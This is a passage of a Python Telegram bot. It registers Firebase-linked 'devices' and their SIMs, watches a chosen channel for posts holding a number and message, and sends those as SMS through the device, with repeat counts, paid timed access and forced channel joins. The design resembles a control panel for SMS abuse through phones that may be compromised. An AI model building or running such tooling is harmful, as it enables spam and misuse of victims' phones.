    if fsmd.get("fj_step")=="awaiting_chat_id":
        raw=text
        chat_id = int(raw) if raw.lstrip("-").isdigit() else (raw if raw.startswith("@") else None)
        if not chat_id: await msg.answer("❌ Send numeric ID or @username"); return
        await state.update_data(fj_step="awaiting_title", fj_chat_id=chat_id)
        await msg.answer("✅ Chat ID saved.\n\nAb display name bhejo:")
        return

    tm=re.search(r"t\.me/([+\w]+)", text)
    if tm: link=f"https://t.me/{tm.group(1)}"
    elif text.startswith("@"): link=f"https://t.me/{text.lstrip('@')}"
    elif text.startswith("http"): link=text
    elif text.lstrip("-").isdigit():
        await state.update_data(fj_step="awaiting_title", fj_link="", fj_chat_id=int(text))
        await msg.answer("✅ Chat ID mila.\n\nAb display name bhejo:"); return
    else: link=f"https://t.me/{text.lstrip('@')}"

    await state.update_data(fj_step="awaiting_chat_id", fj_link=link)
    await msg.answer(f"✅ Link: <code>{link}</code>\n\nAb <b>Chat ID</b> bhejo:",parse_mode="HTML")

# ══════════════════════════════════════════════
#  CALLBACKS
# ══════════════════════════════════════════════
@R.callback_query()
async def cb(cq:CallbackQuery, state:FSMContext):
    d=load(); uid=cq.from_user.id; c=cq.data
    if not can_use(uid,d): await cq.answer("🚫",show_alert=True); return
    u=usr(uid,d)

    if c in ("home","fj:check"):
        await state.clear()
        ok, nj = await check_force_join(cq.bot, uid, d)
        if not ok:
            await sedit(cq,"📢 <b>Join Required</b>",_fj_keyboard(nj))
            if c=="fj:check": await cq.answer("❌ Join all first!",show_alert=True)
            return
        await sedit(cq, home_text(uid,d), main_menu(uid,d))
        if c=="fj:check": await cq.answer("✅ Verified!")

    elif c=="help:show": await sedit(cq, HELP_TEXT, kb([("🔙 Back","home")]))

    elif c=="wiz:start":
        await state.clear()
        if u.get("firebases"):
            await sedit(cq,"⚠️ Setup already done.",kb([("🗑 Reset","wiz:reset"),("🔙 Back","home")]))
        else:
            await state.update_data(wizard=True); await state.set_state(W.fb_url)
            await sedit(cq,"🔥 <b>Firebase URL</b> bhejo:",kb([("❌ Cancel","home")]))

    elif c=="wiz:reset":
        d2=load(); u2=usr(uid,d2)
        u2["firebases"]=[];u2["devices"]=[];u2["active"]={};u2["monitoring"]=False
        save(d2); await state.clear()
        await state.update_data(wizard=True); await state.set_state(W.fb_url)
        await sedit(cq,"🔥 <b>Firebase URL</b> bhejo:",kb([("❌ Cancel","home")]))

    elif c.startswith("fadd:"):
        did=c.split("fadd:",1)[1]; cache=u.get("_dev_cache",{})
        dd=cache.get(did,{}); name=dd.get("deviceName") or dd.get("name") or did[:20]
        sims=dd.get("sims",[]); fsmd=await state.get_data()
        u["devices"].append({"id":did,"name":name,"fb_id":fsmd.get("wiz_fb",""),"sims":sims})
        save(d)
        if sims:
            await state.update_data(wiz_dev=did,wiz_sims_avail=sims,wiz_sims_sel=[])
            await sedit(cq,"📶 <b>Select SIM(s)</b>",sim_kb(sims,[],did))
        else:
            await state.update_data(wiz_dev=did,wiz_sims=[0],wiz_ch=None)
            await state.set_state(W.ch_input)
            await sedit(cq,"📺 <b>Channel bhejo:</b>",kb([("❌ Cancel","home")]))

    elif c=="dev:manual":
        await state.set_state(W.dev_manual)
        await sedit(cq,"🔍 Device ID bhejo:",kb([("❌ Cancel","home")]))

    elif c.startswith("simtog:"):
        parts=c.split(":"); did=parts[1]; idx=int(parts[2])
        fsmd=await state.get_data(); sel=list(fsmd.get("wiz_sims_sel",[]))
        if idx in sel: sel.remove(idx)
        else: sel.append(idx)
        await state.update_data(wiz_sims_sel=sel)
        await sedit(cq,"📶 <b>Select SIM(s)</b>",sim_kb(fsmd.get("wiz_sims_avail",[]),sel,did))

    elif c.startswith("simok:"):
        fsmd=await state.get_data(); sel=fsmd.get("wiz_sims_sel",[])
        if not sel: await cq.answer("Select at least 1!",show_alert=True); return
        await state.update_data(wiz_sims=sel)
        if u.get("channels"):
            rows=[[(f"📺 {ch['name'][:26]}",f"wpick:ch:{ch['id']}")] for ch in u["channels"]]
            rows.append([("➕ Add New","ch:add")]); rows.append([("🔙 Back","home")])
            await sedit(cq,"📺 <b>Channel select karo:</b>",InlineKeyboardMarkup(inline_keyboard=rows))
        else:
            await state.set_state(W.ch_input)
            await sedit(cq,"📺 <b>Channel bhejo:</b>",kb([("❌ Cancel","home")]))

    elif c.startswith("wpick:ch:"):
        cid=c.split("wpick:ch:",1)[1]
        fsmd=await state.get_data()
        await state.update_data(**fsmd,wiz_ch=cid)
        await sedit(cq,"🔁 <b>Repeat count?</b>",repeat_kb())

    elif c=="ch:add":
        await state.set_state(W.ch_input)
        await sedit(cq,"📺 Channel <code>@username</code> or ID bhejo:",kb([("❌ Cancel","home")]))

    elif c.startswith("rpt:"):
        val=c.split(":")[1]; fsmd=await state.get_data()
        if val=="c":
            await state.set_state(W.repeat_cust)
            await sedit(cq,"✏️ Enter 1-20:",kb([("❌ Cancel","home")]))
        else:
            rpt=int(val); await state.clear()
            await sedit(cq,"⏳ Starting…")
            await _wiz_finish(cq.bot,uid,{**fsmd,"wiz_repeat":rpt},load())

    elif c=="mon:go":
        if u.get("monitoring"):
            _stop_mon(uid); u["monitoring"]=False; save(d)
            await sedit(cq,"⏸ Stopped.",main_menu(uid,load()))
        else:
            if not u.get("active",{}).get("fb_url"): await cq.answer("❌ Setup first!",show_alert=True); return
            u["monitoring"]=True; save(d); _start_mon(cq.bot,uid)
            await sedit(cq,"🟢 Started!",main_menu(uid,load()))

    elif c=="dash:show":
        d2=load(); u2=usr(uid,d2)
        s=u2.get("stats",{})
        await sedit(cq,
            f"📊 <b>Dashboard</b>\n\n"
            f"✅ Sent: {s.get('sent',0)}\n"
            f"❌ Failed: {s.get('failed',0)}\n"
            f"🕐 Last: {s.get('last','—')}",
            kb([("🔄 Refresh","dash:show"),("🏠 Home","home")]))

    elif c=="my:menu":
        await sedit(cq,"⚙️ <b>Settings</b>",
            kb([("🧪 Test SMS","test:go")],
               [("🔙 Back","home")]))

    elif c=="test:go":
        if not u.get("active",{}).get("fb_url"): await cq.answer("❌ Setup first!",show_alert=True); return
        await state.set_state(W.test_to)
        await sedit(cq,"🧪 Number bhejo:",kb([("❌ Cancel","my:menu")]))

    elif c=="fwd:menu": await sedit(cq,"📤 <b>Forward Targets</b>",_fwd_kb(uid,d))
    elif c=="fwd:add":
        await state.set_state(W.fwd_add)
        await sedit(cq,"📤 ID or @username bhejo:",kb([("❌ Cancel","fwd:menu")]))
    elif c.startswith("fwd:del:"):
        tgt=c.split("fwd:del:",1)[1]
        u["fwd"]=[t for t in u.get("fwd",[]) if str(t)!=tgt]; save(d)
        await cq.answer("🗑"); await sedit(cq,"📤 Forward",_fwd_kb(uid,d))

    elif c=="reset:self":
        await sedit(cq,"⚠️ Reset?",kb([("✅ Yes","reset:self:yes"),("❌ No","home")]))
    elif c=="reset:self:yes":
        _stop_mon(uid); d2=load(); d2["users"][str(uid)]=_new_user(); save(d2)
        await sedit(cq,"✅ Reset.",main_menu(uid,load()))

    elif c=="adm:menu":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await sedit(cq,"🛡 <b>Admin Tools</b>",adm_menu_kb(uid,d))

    elif c=="adm:users":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        lines=["👥 <b>Users:</b>\n"]
        for k,v in d.get("users",{}).items():
            mon="🟢" if v.get("monitoring") else "🔴"
            lines.append(f"  {mon} <code>{k}</code>")
        await sedit(cq,"\n".join(lines) or "None.",kb([("🔙 Back","adm:menu")]))

    elif c=="adm:adduser":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await state.set_state(W.usr_add_id)
        await sedit(cq,"👤 User ID bhejo:",kb([("❌ Cancel","adm:menu")]))

    elif c.startswith("tacc:"):
        val=c.split(":")[1]; fsmd=await state.get_data(); uid2=fsmd.get("new_uid")
        if not uid2: await cq.answer("Session expired.",show_alert=True); return
        if val=="custom":
            await state.set_state(W.usr_add_exp)
            await sedit(cq,"📅 Date (DD/MM/YYYY):",kb([("❌ Cancel","adm:menu")])); return
        secs=int(val); exp=None if secs==0 else time.time()+secs
        d2=load(); _add_timed(uid2,exp,uid,d2); save(d2); await state.clear()
        await sedit(cq,f"✅ Added.",adm_menu_kb(uid,d2))

    elif c=="adm:stats":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        users=d.get("users",{}); ts=0; tf=0
        for v in users.values():
            s=v.get("stats",{}); ts+=s.get("sent",0); tf+=s.get("failed",0)
        await sedit(cq,f"📊 Users: {len(users)}\n✅ {ts}  ❌ {tf}",kb([("🔙 Back","adm:menu")]))

    elif c=="adm:free":
        if not (is_owner(uid) or is_super_admin(uid,d)): await cq.answer("🚫",show_alert=True); return
        d["free"]=not d.get("free",False); save(d)
        await cq.answer(f"Free: {'ON' if d['free'] else 'OFF'}")
        await sedit(cq,"🛡 Admin",adm_menu_kb(uid,d))

    elif c=="adm:addadmin":
        if not (is_owner(uid) or is_super_admin(uid,d)): await cq.answer("🚫",show_alert=True); return
        await state.set_state(W.adm_add)
        await sedit(cq,"➕ Admin ID bhejo:",kb([("❌ Cancel","adm:menu")]))

    elif c=="adm:zip":
        if not is_owner(uid): await cq.answer("🚫",show_alert=True); return
        await cq.answer("📦")
        zdata=make_zip()
        await cq.bot.send_document(uid,BufferedInputFile(zdata,filename="backup.zip"),caption="📦 Backup")

    elif c=="adm:resetall":
        if not is_owner(uid): await cq.answer("🚫",show_alert=True); return
        await sedit(cq,"💥 Reset ALL?",kb([("✅ Yes","adm:resetall:yes"),("❌ No","adm:menu")]))
    elif c=="adm:resetall:yes":
        if not is_owner(uid): await cq.answer("🚫",show_alert=True); return
        for t in _tasks.values(): t.cancel()
        _tasks.clear(); _seen.clear()
        d2=load(); d2["users"]={};d2["timed_users"]={}; save(d2)
        await sedit(cq,"💥 Done.",adm_menu_kb(uid,load()))

    elif c=="ban:do":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await state.set_state(W.ban_id)
        await sedit(cq,"🚫 Ban ID bhejo:",kb([("❌ Cancel","adm:menu")]))

    elif c=="unban:do":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        banned=d.get("banned",[])
        if not banned: await cq.answer("None banned!",show_alert=True); return
        rows=[[(f"🔓 {b}",f"unban:uid:{b}")] for b in banned]
        rows.append([("❌ Cancel","adm:menu")])
        await sedit(cq,"✅ Unban karo:",InlineKeyboardMarkup(inline_keyboard=rows))

    elif c.startswith("unban:uid:"):
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        bid=int(c.split("unban:uid:",1)[1]); d2=load()
        if bid in d2.get("banned",[]): d2["banned"].remove(bid)
        save(d2); await cq.answer("✅ Unbanned!"); await sedit(cq,"Done",adm_menu_kb(uid,d2))

    elif c=="sadm:menu":
        if not is_owner(uid): await cq.answer("🚫",show_alert=True); return
        await sedit(cq,"🌟 <b>Super Admins</b>",sadm_menu_kb(d))

    elif c=="sadm:add":
        if not is_owner(uid): await cq.answer("🚫",show_alert=True); return
        await state.set_state(W.sadm_add)
        await sedit(cq,"🌟 ID bhejo:",kb([("❌ Cancel","sadm:menu")]))

    elif c.startswith("sadm:del:"):
        if not is_owner(uid): await cq.answer("🚫",show_alert=True); return
        sid=int(c.split("sadm:del:",1)[1])
        if sid in SUPER_ADMINS: await cq.answer("🚫 Locked",show_alert=True); return
        d2=load()
        if sid in d2.get("super_admins",[]): d2["super_admins"].remove(sid)
        save(d2); await cq.answer("🗑"); await sedit(cq,"Done",sadm_menu_kb(d2))

    elif c=="fj:menu":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await sedit(cq,"📢 <b>Force Join</b>",fj_menu_kb(uid,d))

    elif c=="fj:add":
        if not (is_owner(uid) or is_super_admin(uid,d)): await cq.answer("🚫",show_alert=True); return
        await state.set_state(W.fj_add)
        await sedit(cq,"📢 <b>Step 1/3</b>\n\nChannel link bhejo:",kb([("❌ Cancel","fj:menu")]))

    elif c.startswith("fj:del:"):
        if not (is_owner(uid) or is_super_admin(uid,d)): await cq.answer("🚫",show_alert=True); return
        cid_str=c.split("fj:del:",1)[1]; d2=load()
        d2["force_join"]=[x for x in d2.get("force_join",[]) if str(x["id"])!=cid_str]
        save(d2); await cq.answer("🗑"); await sedit(cq,"Done",fj_menu_kb(uid,d2))

    elif c=="<i>noop</i>": pass

    await cq.answer()

# ══════════════════════════════════════════════
#  GROUP/CHANNEL SMS HANDLER
# ══════════════════════════════════════════════
@R.channel_post()
@R.message(F.chat.type.in_({"group","supergroup"}))
async def grp_handler(msg:Message):
    text=msg.text or msg.caption or ""
    if not text: return
    to,sms=parse_sms(text)
    if not to or not sms: return
    d=load()
    for uid_str,u in d.get("users",{}).items():
        ac=u.get("active",{})
        if not u.get("monitoring"): continue
        if str(ac.get("ch_id",""))!=str(msg.chat.id): continue
        asyncio.create_task(_do_send(msg.bot,int(uid_str),to,sms))

# ══════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════
def main():
    bot=Bot(token=BOT_TOKEN)
    dp=Dispatcher(storage=MemoryStorage())
    dp.include_router(R)

    async def on_startup(bot: Bot):
        public_url = (
            os.getenv("PUBLIC_BASE_URL", "").strip()
            or os.getenv("RENDER_EXTERNAL_URL", "").strip()
        ).rstrip("/")
        if not public_url.startswith("https://"):
            raise RuntimeError(
                "Render did not provide an HTTPS URL. Set PUBLIC_BASE_URL "
                "to the service's public HTTPS URL."
            )

        me = await bot.get_me()
        await bot.set_webhook(
            url=f"{public_url}{WEBHOOK_PATH}",
            secret_token=WEBHOOK_SECRET,
            allowed_updates=dp.resolve_used_update_types(),
        )
        log.info(f"✅ Webhook ready for @{me.username} | {_VERSION} | {_CREDITS}")
        try:
            await bot.send_message(
                _owner(),
                f"🚀 <b>{_BRAND_NAME} {_VERSION} Online</b>\n@{me.username}",
                parse_mode="HTML",
            )
        except Exception as e:
            log.warning(f"Owner notify: {e}")

    dp.startup.register(on_startup)

    app = web.Application()

    async def health(_request):
        return web.Response(text="ok")

    app.router.add_get("/", health)
    app.router.add_get("/health", health)

    webhook_handler = SimpleRequestHandler(
        dispatcher=dp,
        bot=bot,
        secret_token=WEBHOOK_SECRET,
        handle_in_background=True,
    )
    webhook_handler.register(app, path=WEBHOOK_PATH)
    setup_application(app, dp, bot=bot)

    port = int(os.getenv("PORT", "10000"))
    web.run_app(app, host="0.0.0.0", port=port)

if __name__=="__main__":
    main()
